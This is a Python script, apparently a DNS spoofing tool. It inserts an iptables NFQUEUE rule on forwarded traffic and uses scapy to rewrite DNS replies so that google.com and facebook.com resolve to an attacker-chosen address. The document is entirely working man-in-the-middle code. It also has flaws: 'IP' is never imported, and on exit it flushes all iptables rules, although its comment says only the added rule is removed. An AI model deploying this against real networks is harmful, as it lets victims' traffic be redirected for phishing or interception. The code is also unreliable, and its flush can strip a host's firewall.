from scapy.layers.dns import DNSRR, DNS, DNSQR
from scapy.layers.inet import UDP
from netfilterqueue import NetfilterQueue
import os

# DNS mapping records
dns_hosts = {
    b"www.google.com": "127.0.0.1",
    b"google.com": "127.0.0.1",
    b"facebook.com": "127.0.0.1"
}


def process_packet(packet):
    # convert netfilter  queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP ´packet, this can be IPerror/UDPerror packets
            pass
        print("[After]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()


def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a google.com answer, this function replaces
    the real IP address with a fake IP address
    """
    # get the dns question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        print("no modification", qname)
        return packet
    # craft new answer, override the original
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and lenth of packet, no mods made yet
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet


if __name__ == "__main__":
    QUEUE_NUM = 0
    #insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate the netfilter queue
    queue = NetfilterQueue()
    try:
        #bind the queue number to our callback process_packet
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # remove that rule we just inserted, going back to normal.
        os.system("iptables --flush")